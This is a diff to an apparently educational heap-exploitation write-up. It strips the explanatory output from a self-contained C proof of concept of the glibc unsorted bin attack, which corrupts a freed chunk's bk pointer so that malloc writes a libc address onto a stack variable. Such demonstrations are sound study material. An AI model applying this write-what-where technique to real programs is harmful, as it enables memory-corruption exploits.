@@ -34,32 +34,20 @@ This PoC demonstrates how to overwrite a stack variable with a libc address.
 #include <stdlib.h>
 
 int main(){
-	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
-
 	unsigned long stack_var=0;
-	fprintf(stderr, "Target on stack at %p. Current value: %ld\n\n", &stack_var, stack_var);
 
 	unsigned long *p=malloc(400);
-	fprintf(stderr, "Allocated first chunk at: %p\n", p);
+	malloc(500); // barrier
 
-	// Allocate another chunk to avoid consolidating p with the top chunk
-	malloc(500);
-
-	// Free the first chunk; it enters the Unsorted Bin
 	free(p);
-	fprintf(stderr, "Chunk freed. victim->bk points to: %p\n",(void*)p[1]);
 
-	//------------VULNERABILITY-----------
-	// Overwrite victim->bk with target_address - 2*sizeof(long)
+	// VULNERABILITY: Corrupt Unsorted Bin bk
 	p[1]=(unsigned long)(&stack_var-2);
-	fprintf(stderr, "Vulnerability: Overwriting victim->bk with %p\n\n",(void*)p[1]);
-	//------------------------------------
 
-	// Trigger the removal from Unsorted Bin
+	// Trigger write-what-where
 	malloc(400);
 
-fprintf(stderr, "After malloc, the target has been rewritten with a libc address:\n");
-	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
+	return 0;
 }
 ```
 
